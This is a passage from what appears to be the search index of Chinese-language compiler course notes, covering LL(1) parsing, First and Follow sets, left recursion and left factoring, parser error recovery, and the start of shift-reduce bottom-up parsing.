\u90fd\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff1a</p> <ol> <li>\\(\\text{First}(\\alpha) \\cap \\text{First}(\\beta) = \\emptyset\\)</li> </ol> <p>\u5373 \\(\\alpha\\) \u548c \\(\\beta\\) \u63a8\u5bfc\u4e0d\u51fa\u4ee5\u540c\u4e00\u4e2a\u5355\u8bcd\u4e3a\u9996\u7684\u4e32</p> Example <ul> <li>\u5047\u8bbe\u4e0b\u4e00\u4e2a\u8f93\u5165\u662f \\(b\\), \u4e14 \\(\\text{First}(\\alpha)\\) \u548c \\(\\text{First}(\\beta)\\) \u4e0d\u76f8\u4ea4\u3002</li> <li>\u82e5 \\(b \\in \\text{First}(\\alpha)\\), \u5219\u9009\u62e9 \\(A \\rightarrow \\alpha\\); \u82e5 \\(b \\in \\text{First}(\\beta)\\), \u5219\u9009\u62e9 \\(A \\rightarrow \\beta\\)</li> </ul> <ol> <li>\\(\\beta, ~ \\alpha\\) \u81f3\u591a\u6709\u4e00\u4e2a\u53ef\u4ee5\u5141\u8bb8\u63a8\u5bfc\u51fa\u7a7a\u4e32</li> <li>\u5982\u679c \\(\\beta \\Rightarrow^* \\epsilon\\), \u90a3\u4e48 \\(\\alpha \\nRightarrow^* \\epsilon\\)\uff0c\u90a3\u4e48 \\(\\text{First}(\\alpha) \\cap \\text{Follow}(A) = \\emptyset\\)</li> </ol> <p>\u9f99\u4e66\u4e2d\u7684\u4e0d\u540c</p> <p>\u9f99\u4e66\u4e2d\u5173\u4e8e\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u7684\u5b9a\u4e49\u65e0\u9700\u524d\u9762\u7684\u8bbe\u5b9a\uff0c\u56e0\u4e3a\u9f99\u4e66\u4e2d First \u96c6\u7684\u5b9a\u4e49\u5305\u542b\u4e86\u7a7a\u4e32, \u4e24\u8005 First set \u4ea4\u96c6\u4e3a\u7a7a\u5df2\u7ecf\u5305\u542b\u4e86 \\(\\alpha\\) \u548c \\(\\beta\\) \u4e0d\u80fd\u540c\u65f6\u63a8\u5bfc\u51fa\u7a7a\u4e32\u7684\u60c5\u51b5</p> <p>\u5373</p> <ul> <li>2 \\(\\alpha\\) \u548c \\(\\beta\\) \u4e0d\u80fd\u540c\u65f6\u63a8\u5bfc\u51fa\u7a7a\u4e32</li> <li>3 \u5982\u679c \\(\\beta\\) \u80fd\u63a8\u5bfc\u7a7a\u4e32\uff0c \\(\\text{First}(\\alpha)\\) \u548c \\(\\text{Follow}(A)\\) \u4e0d\u80fd\u6709\u4ea4\u96c6</li> </ul> <p>\u4ee5\u4e0a\u4e24\u6761\u53ef\u4ee5\u4fdd\u8bc1\u4ea7\u751f\u5f0f\u9009\u62e9\u7684\u552f\u4e00\u6027</p> Example <p>\u5047\u8bbe\u4e0b\u4e00\u4e2a\u8f93\u5165\u662f \\(b\\), \u4e14 \\(\\beta \\Rightarrow^* \\epsilon\\)</p> <ul> <li>\u5982\u679c \\(b \\in \\text{First}(\\alpha)\\), \u9009\u62e9 \\(A \\rightarrow \\alpha\\) (\u5c5e\u4e8e\u6761\u4ef6\u4e00)</li> <li>\u5982\u679c \\(b \\in \\text{Follow}(A)\\), \u9009\u62e9 \\(A \\rightarrow \\beta\\)\uff0c\u56e0\u4e3a \\(A\\) \u6700\u7ec8\u63a8\u5bfc\u51fa\u7a7a\u4e32\u4e14\u540e\u9762\u8ddf\u7740 \\(b\\) (\u5c5e\u4e8e\u6761\u4ef6\u4e8c)</li> </ul>"}, {"location": "Course/cp/parsing1/#ll1_2", "title": "\u5b9e\u73b0 LL(1) \u9884\u6d4b\u5206\u6790", "text": ""}, {"location": "Course/cp/parsing1/#first-follow", "title": "\u8ba1\u7b97 First, Follow \u96c6", "text": "<p>\u7531\u4e8e First, Follow \u96c6\u6d89\u53ca\u7a7a\u4e32\uff0c\u8fd9\u91cc\u5f15\u5165 Nullable \u6982\u5ff5</p> <p>Nullable \u96c6\u7684\u5f52\u7eb3\u5b9a\u4e49</p> <p>\u5982\u679c \\(X\\) \u53ef\u4ee5\u63a8\u5bfc\u51fa\u7a7a\u4e32\uff08\u5373 \\(X\\) \u662f Nullable\uff09, iff</p> <ul> <li>Base case: \\(X \\rightarrow \\epsilon\\), \u90a3\u4e48 \\(X\\) \u663e\u7136\u662f Nullable</li> <li>Inductive case: <ul> <li>\\(X \\rightarrow Y_1 \\dots Y_n\\)</li> <li>\u5176\u4e2d \\(Y_1, \\dots, Y_n\\) \u90fd\u662f\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e14\u5168\u5c5e\u4e8e Nullable \u96c6\uff0c\u90a3\u4e48 \\(X\\) \u4e5f\u662f Nullable</li> </ul> </li> </ul> \u9f99\u4e66 <ul> <li>\u864e\u4e66\u7684 First \u96c6\u5408\u4e0d\u5305\u542b \\(\\epsilon\\)</li> <li>\u9f99\u4e66\u4e0d\u542b nullable \u96c6\uff0c\u800c\u662f\u76f4\u63a5\u5728 First \u96c6\u4e2d\u5305\u542b \\(\\epsilon\\)</li> <li>\u56e0\u6b64\u5728\u4e0b\u9762\u7684\u8ba1\u7b97\u4e2d\uff0cX is nullable \u7b49\u4ef7\u4e8e \\(\\epsilon \\in \\text{First}(X)\\)</li> </ul> \u6839\u636e\u5f52\u7eb3\u5b9a\u4e49\u8ba1\u7b97 Nullable \u96c6 <pre><code>/* Nullable: a set of nonterminals */ \nNullable &lt;- {};\nwhile (Nullable still changes) \n    for (each production X -&gt; a) \n        switch (a) \n        case epsilon:\n            Nullable \u222a= {X}; \n            break;\n        case Y1 \u2026 Yn:\n            if (Y1 in Nullable &amp;&amp; \u2026 &amp;&amp; Yn in Nullable)\n                Nullable \u222a= {X}; \n            break;\n</code></pre> <p>First \u96c6\u7684\u5f52\u7eb3\u5b9a\u4e49</p> \\[ \\text{First}(\\alpha) = \\{a \\vert \\alpha \\Rightarrow^* a \\dots, a \\in T \\} \\] <ul> <li>Base case: If \\(X\\) is a terminal -&gt; \\(\\text{First}(X) = \\{X\\}\\)</li> <li>Inductive case: If \\(X \\rightarrow Y_1 \\dots Y_n\\), <ul> <li>then \\(\\text{First}(X) \\cup = \\text{First}(Y_1)\\)</li> <li>If \\(Y_1\\) is nullable, then \\(\\text{First}(X) \\cup = \\text{First}(Y_2)\\)</li> <li>If \\(Y_1\\) and \\(Y_2\\) are both nullable, then \\(\\text{First}(X) \\cup = \\text{First}(Y_3)\\)</li> <li>\u2026</li> </ul> </li> </ul> \u9f99\u4e66 <ul> <li>\u7531\u4e8e\u9f99\u4e66\u7684 First \u96c6\u5408\u5305\u542b \\(\\epsilon\\), \u4e3a\u4e86\u548c\u864e\u4e66\u7684 nullable \u4e00\u81f4\u6027</li> <li>\u5728\u8ba1\u7b97 \\(X \\rightarrow Y_1 \\dots Y_n\\) \u65f6\uff0c\u53ea\u6709\u5f53 \\(Y_1, \\dots, Y_n\\) \u90fd\u5305\u542b \\(\\epsilon\\) \u65f6\uff0c\u624d\u5c06 \\(\\epsilon\\) \u52a0\u5165 \\(\\text{First}(X)\\)</li> </ul> <p></p> <p>Follow \u96c6\u7684\u5f52\u7eb3\u5b9a\u4e49</p> \\[ \\text{Follow}(A) = \\{a \\vert S \\Rightarrow^* \\dots A a \\dots, a \\in T \\} \\] <ul> <li>Base case: \\(\\text{Follow}(A) = \\{\\}\\)</li> <li>Inductive case: \u5047\u8bbe\u5b58\u5728\u4ea7\u751f\u5f0f \\(B \\rightarrow s1 A s2\\) for any s1 and s2<ul> <li>\\(\\text{Follow}(A) \\cup = \\text{First}(s2)\\)</li> <li>If \\(s2\\) is nullable, then \\(\\text{Follow}(A) \\cup = \\text{Follow}(B)\\)</li> </ul> </li> </ul> \u8ba1\u7b97 Nullable, First, Follow \u96c6\uff08\u864e\u4e66\uff09 <p></p> NullableFirstFollow <ul> <li>\u6839\u636e\u4ea7\u751f\u5f0f 1\uff0c$S \\rightarrow $ \u53ef\u5f97 \\(S\\) \u662f Nullable (\u5c5e\u4e8e Base case)</li> <li>\u65e0 Inductive case</li> </ul> nullable FIRST FOLLOW S\u2019 no S yes B no E no X no <ul> <li>\u6839\u636e\u4ea7\u751f\u5f0f 1, 3, 4, 6, 7, 8, 9, 10</li> </ul> <p>\u5f97\u5230\uff1a</p> nullable FIRST FOLLOW S\u2019 no S yes B no \\ E no \\ X no {, WORD, begin, end, \\ <ul> <li>\u6839\u636e\u4ea7\u751f\u5f0f 0: <ul> <li>\\(\\text{First}(S') \\cup = \\text{First}(S)\\)</li> <li>\u7531\u4e8e \\(S\\) \u662f Nullable, \\(\\text{First}(S') \\cup = \\text{First}(\\$)\\)</li> </ul> </li> <li>\u6839\u636e\u4ea7\u751f\u5f0f 2: <ul> <li>\\(\\text{First}(S) \\cup = \\text{First}(X)\\)</li> <li>\\(X\\) \u4e0d\u662f Nullable\uff0c\u7ed3\u675f</li> </ul> </li> <li>\u6839\u636e\u4ea7\u751f\u5f0f 5: <ul> <li>\\(\\text{First}(X) \\cup = \\text{First}(B)\\)</li> <li>\\(B\\) \u4e0d\u662f Nullable\uff0c\u7ed3\u675f</li> </ul> </li> <li>\u5f97\u5230:</li> </ul> nullable FIRST FOLLOW S\u2019 no {, WORD, begin, end, \\, $ S yes {, WORD, begin, end, \\ B no \\ E no \\ X no {, WORD, begin, end, \\ <ul> <li>\u6839\u636e\u4ea7\u751f\u5f0f 0: \\(\\text{Follow}(S) \\cup = \\text{First}(\\$)\\)</li> <li>\u6839\u636e\u4ea7\u751f\u5f0f 2: <ul> <li>\\(\\text{Follow}(X) \\cup = \\text{First}(S)\\)</li> <li>\u7531\u4e8e \\(S\\) \u662f Nullable, \\(\\text{Follow}(X) \\cup = \\text{Follow}(S)\\)</li> </ul> </li> <li>\u6839\u636e\u4ea7\u751f\u5f0f 5: <ul> <li>\\(\\text{Follow}(B) \\cup = \\text{First}(SE)\\)</li> <li>\\(\\text{Follow}(S) \\cup = \\text{First}(E)\\)</li> <li>\\(\\text{Follow}(E) \\cup = \\text{Follow}(X)\\)</li> </ul> </li> <li>\u6839\u636e\u4ea7\u751f\u5f0f 6: <ul> <li>\\(\\text{Follow}(S) \\cup = \\text{First}(\\})\\)</li> </ul> </li> </ul> <p>\u5f97\u5230\uff1a</p> nullable FIRST FOLLOW S\u2019 no {, WORD, begin, end, \\, $ S yes {, WORD, begin, end, \\ \\, $, } B no \\ {, WORD, begin, end, \\ E no \\ {, WORD, begin, end, \\, $, } X no {, WORD, begin, end, \\ {, WORD, begin, end, \\, $, } \u4f18\u5316 Nullable, First, Follow \u7684\u8ba1\u7b97 <p></p>"}, {"location": "Course/cp/parsing1/#_6", "title": "\u6784\u9020\u9884\u6d4b\u5206\u6790\u8868", "text": "<p>\u9884\u6d4b\u5206\u6790\u8868\u662f\u6307\u8868\u9a71\u52a8\u5206\u6790\u7a0b\u5e8f\u6240\u9700\u8981\u7684\u4e8c\u7ef4\u8868 M</p> <ul> <li>\u8868\u7684\u6bcf\u4e00\u884c A \u5bf9\u5e94\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26</li> <li>\u8868\u7684\u6bcf\u4e00\u5217 a \u5bf9\u5e94\u67d0\u4e2a\u7ec8\u7ed3\u7b26\u6216\u8f93\u5165\u7ed3\u675f\u7b26 $</li> <li>\u8868\u4e2d\u7684\u9879 M[A, a] \u8868\u793a\uff1a\u9488\u5bf9\u975e\u7ec8\u7ed3\u7b26 A\uff0c\u5f53\u5176\u4e0b\u4e00\u4e2a\u8f93\u5165 Token \u662f a \u65f6\uff0c\u53ef\u4ee5\u9009\u62e9\u7684\u4ea7\u751f\u5f0f\u96c6\u5408</li> </ul> <p>\u6784\u9020\u9884\u6d4b\u5206\u6790\u8868</p> <p>\u5bf9\u6587\u6cd5 \\(G\\) \u7684\u6bcf\u4e2a\u4ea7\u751f\u5f0f \\(X \\rightarrow \\gamma\\)</p> <ul> <li>If \\(t \\in \\text{First}(\\gamma)\\): enter \\(X \\rightarrow \\gamma\\) into \\(M[X, t]\\)</li> <li>If \\(\\gamma\\) is Nullable and \\(t \\in \\text{Follow}(X)\\): enter \\(X \\rightarrow \\gamma\\) into \\(M[X, t]\\)</li> </ul> \u6784\u9020\u9884\u6d4b\u5206\u6790\u8868 <p>\u7531\u4e0a\u9762\u7684 First, Follow \u96c6\u8ba1\u7b97\u7ed3\u679c\uff0c\u6784\u9020\u9884\u6d4b\u5206\u6790\u8868</p> nullable FIRST FOLLOW S\u2019 no {, WORD, begin, end, \\, $ S yes {, WORD, begin, end, \\ \\, $, } B no \\ {, WORD, begin, end, \\ E no \\ {, WORD, begin, end, \\, $, } X no {, WORD, begin, end, \\ {, WORD, begin, end, \\, $, } \u4ea7\u751f\u5f0f 0\u4ea7\u751f\u5f0f 1\u6700\u7ec8\u9884\u6d4b\u8868 <p>\\(S' \\rightarrow S \\$\\)</p> <p>\u56e0\u4e3a \\(\\text{First}(S\\$)\\) = <code>$, {, WORD, begin, end, \\</code>, \u6240\u4ee5\u586b\u5165 \\(S' \\rightarrow S \\$\\)</p> $ { WORD begin end \\ } S\u2019 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ S B E X <p>$S \\rightarrow $</p> <p>\u76f8\u5f53\u4e8e \\(\\gamma\\) is nullable, \\(\\text{Follow}(S)\\) = <code>\\, $, }</code>, \u6240\u4ee5\u586b\u5165 $S \\rightarrow $</p> $ { WORD begin end \\ } S\u2019 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ 0 S\u2019-&gt;S$ S 1 S -&gt; 1 S -&gt; 1 S -&gt; B E X <p></p> <p>LL(1) \u6587\u6cd5</p> <ul> <li>If a predictive parsing table constructed this way contains no duplicate entries, the grammar is called LL(1)!</li> </ul> <p>\u4e0a\u8ff0\u6784\u9020\u7684\u9884\u6d4b\u5206\u6790\u8868\u4e2d\uff0c\u56e0\u4e3a\u4e0d\u6ee1\u8db3\u6bcf\u4e2a\u5355\u5143\u683c\u53ea\u6709\u4e00\u4e2a\u4ea7\u751f\u5f0f\u7684\u6761\u4ef6\uff0c\u6240\u4ee5\u4e0d\u662f LL(1) \u6587\u6cd5</p> <ul> <li>Left-to-right parse, left-most derivation, 1 symbol lookahead</li> </ul>"}, {"location": "Course/cp/parsing1/#_7", "title": "\u9884\u6d4b\u5206\u6790", "text": "<p>LL(1) \u5206\u6790\u7684\u5b9e\u73b0\u53ef\u4ee5\u5206\u4e3a\uff1a</p> <ul> <li>\u9012\u5f52\u4e0b\u964d LL(1) \u5206\u6790\uff1a<ul> <li>\u9012\u5f52\u4e0b\u964d\u5206\u6790: \u975e\u7ec8\u7ed3\u7b26\u5bf9\u5e94\u5b50\u8fc7\u7a0b</li> </ul> </li> <li>\u975e\u9012\u5f52 LL(1) \u5206\u6790 (\u4e0d\u8981\u6c42\u638c\u63e1)\uff1a<ul> <li>\u4f7f\u7528\u663e\u5f0f\u7684\u6808\uff0c\u800c\u4e0d\u662f\u9012\u5f52\u8c03\u7528\u6765\u5b8c\u6210\u5206\u6790 (\u7c7b\u4f3c\u6a21\u62df\u4e0b\u63a8\u81ea\u52a8\u673aPDA)</li> </ul> </li> </ul> <p>LL(1) \u7684\u9012\u5f52\u4e0b\u964d\u5b9e\u73b0</p> <ul> <li>\u9012\u5f52\u4e0b\u964d\u8bed\u6cd5\u5206\u6790\u7a0b\u5e8f\u7531\u4e00\u7ec4\u8fc7\u7a0b\u7ec4\u6210</li> <li>\u6bcf\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7\u5bf9\u5e94\u4e8e\u4e00\u4e2a\u8fc7\u7a0b</li> <li>\u53ef\u4ee5\u901a\u8fc7\u5411\u524d\u770b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7\u6765\u552f\u4e00\u5730\u9009\u62e9\u4ea7\u751f\u5f0f</li> </ul> <pre><code>void A() {\n    \u9009\u62e9\u4e00\u4e2a\u4ea7\u751f\u5f0f A -&gt; X1 X2 ... Xn\n    for (i = 1 to n) {\n        if (Xi \u662f\u975e\u7ec8\u7ed3\u7b26) {\n            \u8c03\u7528\u8fc7\u7a0b Xi();\n        } else if (Xi \u7b49\u4e8e\u5f53\u524d\u8f93\u5165\u7b26\u53f7) {\n            \u8bfb\u5165\u4e0b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7;\n        } else {\n            \u62a5\u9519;\n        }\n    }\n}\n</code></pre> LL(1) \u7684\u9012\u5f52\u4e0b\u964d\u5b9e\u73b0 Example 1Example 2 <p></p> <p>\u597d\u50cf\u8fd9\u4e2a\u6587\u6cd5\u548c First, Follow \u6ca1\u6709\u5173\u7cfb\uff0c\u4f46\u53ea\u662f\u56e0\u4e3a\u8fd9\u4e2a\u6587\u6cd5\u592a\u7b80\u5355\u4e86\u3002</p> <p>For each non-terminal, the first symbols Y1 in the right-hand sides of its productions are different terminals</p> <p></p>"}, {"location": "Course/cp/parsing1/#_8", "title": "\u6d88\u9664\u5de6\u9012\u5f52\u3001\u63d0\u5de6\u516c\u56e0\u5b50", "text": "<p>LL(1) \u6587\u6cd5\u7684\u91cd\u8981\u6027\u8d28</p> <ul> <li>\u65e0\u4e8c\u4e49\u6027 | no ambiguity</li> <li>\u65e0\u5de6\u9012\u5f52 | no left recursion</li> <li>\u65e0\u5de6\u516c\u56e0\u5b50 | no left factoring</li> </ul> \u5de6\u9012\u5f52 (left-recursive) \u6587\u6cd5 <ul> <li>\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u4e2d\u6709\u975e\u7ec8\u7ed3\u7b26\u53f7 \\(A\\) \u4f7f\u5f97 \\(A \\Rightarrow^+ A \\alpha\\), \u90a3\u4e48\u79f0\u8be5\u6587\u6cd5\u662f\u5de6\u9012\u5f52\u7684</li> <li>\\(S \\rightarrow S a \\vert b\\) \u4e3a\u76f4\u63a5/\u7acb\u5373\u5de6\u9012\u5f52</li> </ul> <p>\u5de6\u9012\u5f52\u6587\u6cd5\u4f1a\u5bfc\u81f4\u9012\u5f52\u4e0b\u964d\u5206\u6790\u4e2d\u7684\u65e0\u9650\u5faa\u73af</p> <ul> <li>\u4f8b\u5982\uff1a\\(S \\rightarrow Sa \\vert b\\)</li> <li>\u6700\u5de6\u63a8\u5bfc\uff1a\\(S \\Rightarrow Sa \\Rightarrow Saa \\Rightarrow \\dots\\)</li> <li>\u89e3\u51b3\u601d\u8def\u5c31\u662f\uff1a\u9650\u5236\u6587\u6cd5\u6216\u8005\u8fdb\u884c\u6587\u6cd5\u53d8\u6362</li> </ul> \u6587\u6cd5\u53d8\u6362\uff1a\u6d88\u9664\u76f4\u63a5\u5de6\u9012\u5f52 <ul> <li>\u76f4\u63a5\u5de6\u9012\u5f52\uff1a\\(A \\rightarrow A \\alpha \\vert \\beta\\)</li> <li>\u6d88\u9664\u76f4\u63a5\u5de6\u9012\u5f52\uff1a\\(A \\rightarrow \\beta A'\\), \\(A' \\rightarrow \\alpha A' \\vert \\epsilon\\) (\u5c06\u5de6\u9012\u5f52\u8f6c\u6210\u53f3\u9012\u5f52)</li> </ul> <p>\u901a\u7528\u5de6\u9012\u5f52\u6d88\u9664\u65b9\u6cd5(\u9f99\u4e66)</p> <p>\u4e00\u822c\u6765\u8bf4</p> \\[ S \\rightarrow S ~ \\alpha_1 ~ \\vert ~ \\dots ~ \\vert ~ S ~ \\alpha_n ~ \\vert ~ \\beta_1 ~ \\vert ~ \\dots ~ \\vert ~\\beta_m \\] <p>\u53ef\u4ee5\u6982\u62ec\u6240\u6709\u5305\u542b\u5de6\u9012\u5f52\u7684\u60c5\u51b5, \u53ef\u4ee5\u5c06\u5176\u6539\u5199\u4e3a\uff1a</p> \\[ \\begin{aligned} &amp;S \\rightarrow \\beta_1 ~ S' ~ \\vert ~ \\dots ~ \\vert ~ \\beta_m ~ S' \\\\ &amp;S' \\rightarrow \\alpha_1 ~ S' ~ \\vert ~ \\dots ~ \\vert ~ \\alpha_n ~ S' ~ \\vert ~\\epsilon \\end{aligned} \\] \u5de6\u516c\u56e0\u5b50 (left-factored) \u6587\u6cd5 <ul> <li>\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u4e2d\u6709\u975e\u7ec8\u7ed3\u7b26\u53f7 \\(A\\) \u4f7f\u5f97 \\(A \\rightarrow \\alpha \\beta \\vert \\alpha \\gamma\\), \u90a3\u4e48\u79f0\u8be5\u6587\u6cd5\u662f\u5de6\u516c\u56e0\u5b50\u7684</li> <li>\u4f1a\u5bfc\u81f4\u540c\u4e00\u975e\u7ec8\u7ed3\u7b26\u7684\u591a\u4e2a\u5019\u9009\u4ea7\u751f\u5f0f\u7684\u524d\u7f00\u76f8\u540c\uff0c\u5bfc\u81f4\u56de\u6eaf</li> <li>\u89e3\u51b3\u601d\u8def\u4e0e\u5de6\u9012\u5f52\u7c7b\u4f3c\uff1a\u9650\u5236\u6587\u6cd5\u6216\u8005\u8fdb\u884c\u6587\u6cd5\u53d8\u6362</li> </ul> \u6587\u6cd5\u53d8\u6362: \u63d0\u5de6\u516c\u56e0\u5b50 <p>\u5bf9\u5f62\u5982\uff1a</p> \\[ A \\rightarrow \\alpha \\beta \\vert \\alpha \\gamma \\] <p>\u7684\u4ea7\u751f\u5f0f\uff0c\u7528\u5982\u4e0b\u65b9\u5f0f (\u63d0\u53d6\u76f8\u540c\u7684\u5f00\u59cb\u7b26\u53f7\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u7528\u4e00\u4e2a\u65b0\u7684 non-terminal \u6765\u4ee3\u66ff) \u6539\u5199\uff1a</p> \\[ \\begin{aligned} &amp;A \\rightarrow \\alpha A' \\\\ &amp;A' \\rightarrow \\beta \\vert \\gamma \\end{aligned} \\] <p>\u5176\u4e2d \\(A'\\) \u662f\u65b0\u7684\u975e\u7ec8\u7ed3\u7b26</p> <p>\u901a\u8fc7\u6539\u5199\u4ea7\u751f\u5f0f\u6765\u63a8\u8fdf\u51b3\u5b9a\uff0c \u7b49\u8bfb\u5165\u4e86\u8db3\u591f\u591a\u7684\u8f93\u5165\uff0c\u83b7\u5f97\u8db3\u591f\u4fe1\u606f\u540e\u518d\u505a\u9009\u62e9</p>"}, {"location": "Course/cp/parsing1/#error-recovery", "title": "\u9519\u8bef\u6062\u590d | Error Recovery", "text": "<p>\u7ecf\u8fc7\u524d\u9762\u7684\u6b65\u9aa4\u6784\u5efa\u4e86\u9884\u6d4b\u5206\u6790\u8868\u540e, \u9884\u6d4b\u8868\u4e2d\u7684\u7a7a\u5355\u5143\u683c (blank entry) \u8868\u793a\u4e00\u4e2a\u8bed\u6cd5\u9519\u8bef (syntax error)</p> <p>e.g., \\(M[T, x] = \\emptyset\\) indicates that the parsing function \\(T()\\) does not expect to see token \\(x\\) - this is a syntax error</p> <p>\u9047\u5230\u9519\u8bef\u7684\u65f6\u5019\u5982\u4f55\u89e3\u51b3\uff1f</p> <ul> <li>Raise an exception and quit parsing (safe but not user-friendly)</li> <li>print an error message and recover from the error (more user-friendly, other syntax errors can be found in the same compilation)</li> </ul>"}, {"location": "Course/cp/parsing1/#raise-and-quit", "title": "Raise and Quit", "text": "<pre><code>void T() {\n    switch (token) {\n        case ID: \n        case NUM:\n        case LPAREN: F(); Tprime(); break;\n        default:\n            error();\n    }\n}\n</code></pre>"}, {"location": "Course/cp/parsing1/#print-and-recover", "title": "Print and Recover", "text": "<ul> <li>A syntax error occurs when the string of input tokens is not a sentence in the language. Error recovery is a way of finding some sentence similar to that string of tokens.</li> <li>This can proceed by deleting, replacing, or inserting tokens.</li> <li>Through inserting: pretend we have the token and return normally</li> </ul> <pre><code>void T( ) {\n    switch (tok) { \n        case ID: \n        case NUM: \n        case LPAREN: F( ); Tprime( ); break; \n        default: print(\"expected id, num, or left-paren\"); \n    }\n}\n</code></pre> <p>\u505a\u63d2\u5165\u6bd4\u8f83\u5371\u9669\uff0cif the error cascades to produce another error, the process might loop indefinitely</p> <ul> <li>Deleting tokens is safer, because the loop must eventually terminate when EOF is reached</li> <li>Simple recover by deletion works by skipping tokens util a token in the \\(\\text{FOLLOW}\\) set is reached.</li> </ul> <pre><code>int Tprime_follow [ ] = {PLUS, TIMES, RPAREN, EOF, -1}; \nvoid Tprime( ) { \n    switch (tok) { \n        case PLUS: break; \n        case TIMES: eat(TIMES); F(); Tprime(); break; \n        case RPAREN: break; \n        case EOF: break; \n        default: \n            print(\"expected +, *, right-paren, or end-of-file\"); \n            skipto(Tprime_follow);\n    }\n} \n</code></pre> <ol> <li> <p>David G. Cantor. 1962. On The Ambiguity Problem of Backus Systems. J. ACM 9, 4 (Oct. 1962), 477\u2013479. \u21a9</p> </li> </ol>"}, {"location": "Course/cp/parsing2/", "title": "Parsing (Bottom-Up Parsing)", "text": "<p> \u7ea6 3627 \u4e2a\u5b57  34 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Bottom-Up Parsing</p> <ul> <li>\u8868\u8fbe\u529b: Every LL(k) grammar is also LR(k) </li> <li>\u88ab Parser \u81ea\u52a8\u751f\u6210\u5668\u5e7f\u6cdb\u91c7\u7528 (Yacc, Bison, etc)</li> </ul> <p>LR(k) parsing: </p> <ul> <li>L: left-to-right scan of input</li> <li>R: rightmost derivation in reverse</li> <li>k: k tokens of lookahead (\u5f53 k\u88ab\u7701\u7565\u7684\u65f6\u5019, \u5047\u8bbe\u4e3a1)</li> </ul> <p>The Idea of Bottom-Up Parsing</p> <ul> <li>\u81ea\u5e95\u5411\u4e0a\u7684\u8bed\u6cd5\u5206\u6790\u8fc7\u7a0b\u53ef\u4ee5\u770b\u6210\u662f\u4ece\u4e32 \\(w\\) \u5f52\u7ea6\u4e3a\u6587\u6cd5\u5f00\u59cb\u7b26\u53f7 \\(S\\) \u7684\u8fc7\u7a0b</li> <li>\u5f52\u7ea6\u6b65\u9aa4\uff1a\u4e00\u4e2a\u4e0e\u67d0\u4ea7\u751f\u5f0f\u4f53\u76f8\u5339\u914d\u7684\u7279\u5b9a\u5b50\u4e32\u88ab\u66ff\u6362\u4e3a\u8be5\u4ea7\u751f\u5f0f\u5934\u90e8\u7684\u975e\u7ec8\u7ed3\u7b26\u53f7</li> <li>\u95ee\u9898\u5316\u4e3a\uff1a<ul> <li>\u4f55\u65f6\u5f52\u7ea6 (\u5f52\u7ea6\u54ea\u4e9b\u7b26\u53f7\u4e32) \uff1f</li> <li>\u5f52\u7ea6\u5230\u54ea\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7\uff1f</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing2/#shift-reduce-", "title": "Shift-Reduce | \u79fb\u5165-\u89c4\u7ea6", "text": "<p>Idea</p> <p>\u5c06\u8f93\u5165\u4e32\u5207\u5206\u6210\u4e24\u4e2a\u5b50\u4e32\uff1a</p> <ul> <li>Right substring (a string of terminals): \u8fd8\u6ca1\u88ab parser \u5904\u7406\u7684\u90e8\u5206</li> <li>Left substring (a string of terminals and non-terminals): \u5df2\u7ecf\u88ab parser \u5904\u7406\u7684\u90e8\u5206</li> </ul> <p>\u5de6\u53f3\u5b50\u4e32\u4f7f\u7528\u4e00\u4e2a\u7279\u6b8a\u7b26\u53f7 <code>\uff5c</code> \u5206\u9694 (<code>\uff5c</code> \u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u4e00\u90e8\u5206)\uff0c\u521d\u59cb\u5316\u65f6\uff0c<code>\uff5c</code> \u5728\u6700\u5de6\u8fb9\u3002</p> Example <p></p> <ul> <li>\u76f8\u5f53\u4e8e\u6700\u53f3\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b\uff1a</li> </ul> \\[ \\textcolor{black}{E} \\Rightarrow \\textcolor{black}{E} + (\\textcolor{red}{E}) \\Rightarrow \\textcolor{red}{E} + (\\textcolor{black}{int}) \\Rightarrow \\textcolor{black}{E} + (\\textcolor{red}{E}) + (\\textcolor{black}{int}) \\Rightarrow \\textcolor{red}{E} + (\\textcolor{black}{int}) + (\\textcolor{black}{int}) \\Rightarrow \\textcolor{black}{int} + (\\textcolor{black}{int}) + (\\textcolor{black}{int}) \\] <ul> <li>\u5982\u4f8b\u5b50\u6240\u793a\uff0cLR \u5206\u6790\u5176\u5b9e\u5c31\u662f\u6700\u53f3\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b\uff0c\u9650\u5236\u4e86\u89c4\u7ea6\u65b9\u5f0f</li> </ul> <p>\u6700\u53f3\u53e5\u578b</p> <ul> <li>\u6700\u53f3\u53e5\u578b\uff1a\u6700\u53f3\u63a8\u5bfc\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u53e5\u578b</li> <li>LR \u5206\u6790\u7684\u6bcf\u4e00\u6b65\u90fd\u662f\u6700\u53f3\u53e5\u578b</li> </ul> <p>LR \u5206\u6790\u7684\u4e00\u822c\u6a21\u5f0f\u662f \u57fa\u4e8e\u6808\u7684 shift-reduce</p> <p>\u8003\u8651 \\(\\alpha \\vert \\beta\\)</p> <p>LR \u5206\u6790\u6709\u4e24\u4e2a component\uff0c\u56db\u4e2a action</p> <ul> <li>Two components:<ul> <li>Stack: \u4fdd\u5b58\u5de6\u5b50\u4e32 \\(\\alpha\\) (terminals and non-terminals)</li> <li>Input Stream: \u4fdd\u5b58\u53f3\u5b50\u4e32 \\(\\beta\\) (terminals)</li> </ul> </li> <li>Four actions:<ul> <li>Shift: \u5c06\u4e0b\u4e00\u4e2a\u8f93\u5165 token (terminal) \u63a8\u5165\u6808\u9876</li> <li>Reduce: <ul> <li>Top of stack should match 